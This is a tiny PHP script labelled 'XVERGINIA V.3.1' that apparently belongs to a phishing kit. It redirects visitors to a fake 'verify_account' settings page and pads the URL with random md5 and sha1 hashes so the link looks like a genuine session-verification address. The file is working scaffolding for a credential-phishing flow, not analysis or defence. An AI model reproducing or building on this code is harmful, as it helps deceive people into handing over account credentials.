<?php
// XVERGINIA V.3.1
header ("location:../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."") ;
?>